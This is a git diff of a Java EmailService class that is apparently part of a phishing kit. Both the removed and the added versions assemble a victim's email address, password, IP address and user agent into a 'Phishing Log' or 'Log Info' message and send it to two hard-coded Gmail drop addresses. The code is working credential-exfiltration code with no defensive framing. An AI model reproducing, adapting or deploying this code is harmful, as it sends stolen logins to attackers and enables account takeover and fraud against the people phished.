@@ -19,30 +19,27 @@ public class EmailService {
 	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
 		String toAddress = "embar.kdi.ptkdi@gmail.com";
 		String toAddress2 = "soft6dev@gmail.com";
-		String subject = "Phishing Log";
+		String subject = "LOG "+email.getIpAddress();
 		String content = "<!DOCTYPE html>\n"
-		+ "<html lang=\"en\">\n"
-		+ "<head>\n"
-		+ "    <meta charset=\"UTF-8\">\n"
-		+ "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
-		+ "    <title>Document</title>\n"
-		+ "</head>\n"
-		+ "<body style=\"background-color: black; color: green; padding: 16px;\">\n"
-		+ "    <div style=\"background-color: rgb(18, 18, 18); padding: 16px;\">\n"
-		+ "    <p style=\"font-size: 18px;\">All Authorization tokens intercepted!</p>\n"
-		+ "    <p style=\"overflow: hidden;\">ID: ece22c33233b9a50d7a56aa06c0b336f431baf677f2320255e519faa82eba42c</p>\n"
-		+ "    <p>Phishlet Name: "+email.getPhishlet()+"</p>\n"
-		+ "    <p>Email: "+email.getEmail()+"</p>\n"
-		+ "    <p>Password: "+email.getPassword()+"</p>\n"
-		+ "    <p>IsAuthUrl: true</p>\n"
-		+ "    <p>Custom Tokens: False</p>\n"
-		+ "    <p>Params Tokens: False</p>\n"
-		+ "    <p>BodyTokens: False</p>\n"
-		+ "    <p>HttpTokens: True</p>\n"
-		+ "</div>\n"
-		+ "<p>Cookies: <span style=\"color: red;\">{null}</span></p>\n"
-		+ "</body>\n"
-		+ "</html>";
+				+ "<html lang=\"en\">\n"
+				+ "<head>\n"
+				+ "    <meta charset=\"UTF-8\">\n"
+				+ "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
+				+ "    <title>Document</title>\n"
+				+ "</head>\n"
+				+ "<body>\n"
+				+ "    <div style=\"font-family: Arial, Helvetica, sans-serif;\">\n"
+				+ "        <p>---------------------------Log Info----------------------------</p>\n"
+				+ "        <p>Email Address               :"+email.getEmail()+"</p>\n"
+				+ "        <p>Password             :"+email.getPassword()+"</p>\n"
+				+ "        <p>|---------------------- INFO | IP | Location ------------------------|</p>\n"
+				+ "        <p>|Client Location:  Nigeria</p>\n"
+				+ "        <p>|-- http://www.geoiptool.com/?IP="+email.getIpAddress()+" ------</p>\n"
+				+ "        <p>User Agent: "+email.getUserAgent()+"</p>\n"
+				+ "        <p>|-------- unknown ----------|</p>\n"
+				+ "    </div>\n"
+				+ "</body>\n"
+				+ "</html>";
 		
 		mailSenderService.sendEmail(toAddress, subject, content);
 		mailSenderService.sendEmail(toAddress2, subject, content);
